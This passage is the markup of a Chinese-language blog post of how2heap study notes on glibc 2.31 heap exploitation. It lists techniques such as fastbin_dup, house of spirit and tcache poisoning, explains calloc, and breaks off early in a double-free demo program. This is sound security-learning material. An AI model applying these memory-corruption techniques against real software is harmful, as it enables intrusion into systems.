<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":{"valine":{"order":-1}}},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="how2heap 学习">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap">
<meta property="og:url" content="http://example.com/2025/04/25/how2heap/index.html">
<meta property="og:site_name" content="le0n-blog">
<meta property="og:description" content="how2heap 学习">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-04-25T03:11:13.083Z">
<meta property="article:modified_time" content="2025-06-20T07:04:12.108Z">
<meta property="article:author" content="leon">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/2025/04/25/how2heap/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/04/25/how2heap/","path":"2025/04/25/how2heap/","title":"how2heap"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>how2heap | le0n-blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">le0n-blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#glibc-2-31"><span class="nav-number">1.</span> <span class="nav-text">glibc 2.31</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup"><span class="nav-number">1.1.</span> <span class="nav-text">fastbin_dup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="nav-number">1.1.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7"><span class="nav-number">1.1.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C"><span class="nav-number">1.1.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">1.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-number">1.3.</span> <span class="nav-text">fastbin_dup_into_stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-2"><span class="nav-number">1.3.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-reverse-into-tcache"><span class="nav-number">1.4.</span> <span class="nav-text">fastbin_reverse_into_tcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-3"><span class="nav-number">1.4.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-3"><span class="nav-number">1.4.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake"><span class="nav-number">1.5.</span> <span class="nav-text">house of botcake</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-4"><span class="nav-number">1.5.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-4"><span class="nav-number">1.5.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-einherjar"><span class="nav-number">1.6.</span> <span class="nav-text">house of einherjar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-5"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-5"><span class="nav-number">1.6.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-5"><span class="nav-number">1.6.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lore"><span class="nav-number">1.7.</span> <span class="nav-text">house of lore</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-6"><span class="nav-number">1.7.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-6"><span class="nav-number">1.7.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-6"><span class="nav-number">1.7.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-6"><span class="nav-number">1.7.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-mind"><span class="nav-number">1.8.</span> <span class="nav-text">house of mind</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-7"><span class="nav-number">1.8.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-7"><span class="nav-number">1.8.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-7"><span class="nav-number">1.8.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-7"><span class="nav-number">1.8.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-7"><span class="nav-number">1.8.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">1.9.</span> <span class="nav-text">house of spirit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-8"><span class="nav-number">1.9.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-8"><span class="nav-number">1.9.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-8"><span class="nav-number">1.9.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-8"><span class="nav-number">1.9.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-8"><span class="nav-number">1.9.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#largebin-attack"><span class="nav-number">1.10.</span> <span class="nav-text">largebin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-9"><span class="nav-number">1.10.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-9"><span class="nav-number">1.10.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-9"><span class="nav-number">1.10.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-9"><span class="nav-number">1.10.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-9"><span class="nav-number">1.10.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mmap-overlapping-chunks"><span class="nav-number">1.11.</span> <span class="nav-text">mmap_overlapping_chunks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overlapping-chunk"><span class="nav-number">1.12.</span> <span class="nav-text">overlapping_chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-10"><span class="nav-number">1.12.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-10"><span class="nav-number">1.12.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-10"><span class="nav-number">1.12.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-10"><span class="nav-number">1.12.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-10"><span class="nav-number">1.12.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-house-of-spirit"><span class="nav-number">1.13.</span> <span class="nav-text">tcache_house_of_spirit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-11"><span class="nav-number">1.13.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-11"><span class="nav-number">1.13.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-11"><span class="nav-number">1.13.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-11"><span class="nav-number">1.13.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-11"><span class="nav-number">1.13.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-poisoning"><span class="nav-number">1.14.</span> <span class="nav-text">tcache_poisoning</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-12"><span class="nav-number">1.14.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-12"><span class="nav-number">1.14.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-12"><span class="nav-number">1.14.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-12"><span class="nav-number">1.14.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-12"><span class="nav-number">1.14.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-stashing-unlink-attack"><span class="nav-number">1.15.</span> <span class="nav-text">tcache_stashing_unlink_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-13"><span class="nav-number">1.15.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-13"><span class="nav-number">1.15.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-13"><span class="nav-number">1.15.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-13"><span class="nav-number">1.15.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-13"><span class="nav-number">1.15.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsafe-unlink"><span class="nav-number">1.16.</span> <span class="nav-text">unsafe_unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-14"><span class="nav-number">1.16.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-14"><span class="nav-number">1.16.2.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-14"><span class="nav-number">1.16.3.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-14"><span class="nav-number">1.16.4.</span> <span class="nav-text">相关技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-14"><span class="nav-number">1.16.5.</span> <span class="nav-text">利用效果</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="leon"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">leon</p>
  <div class="site-description" itemprop="description">Take more notes to reach higher efficiency.</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/le0n-daily" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;le0n-daily" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1192876128@gmail.com" title="E-Mail → mailto:1192876128@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/25/how2heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leon">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="le0n-blog">
      <meta itemprop="description" content="Take more notes to reach higher efficiency.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="how2heap | le0n-blog">
      <meta itemprop="description" content="how2heap 学习">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          how2heap
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-04-25 11:11:13" itemprop="dateCreated datePublished" datetime="2025-04-25T11:11:13+08:00">2025-04-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-06-20 15:04:12" itemprop="dateModified" datetime="2025-06-20T15:04:12+08:00">2025-06-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>70k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:04</span>
    </span>
</div>

            <div class="post-description">how2heap 学习</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc 2.31"></a>glibc 2.31</h1><p>docker-ubuntu-20.04- 2.31-0ubuntu9.16</p>
<p><code>calloc()</code> 函数用于分配一块内存，并初始化所有字节为零。它通常用于需要分配多个元素的数组或结构体，并且希望在分配时将它们的初始值设置为零。<strong>它绕过tcache来分配内存</strong></p>
<p><strong>函数原型</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ul>
<li><code>num</code>：要分配的元素数量。</li>
<li><code>size</code>：每个元素的字节大小。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回指向分配内存块的指针（类型为 <code>void*</code>）。</li>
<li>如果分配失败，返回 <code>NULL</code>。</li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span 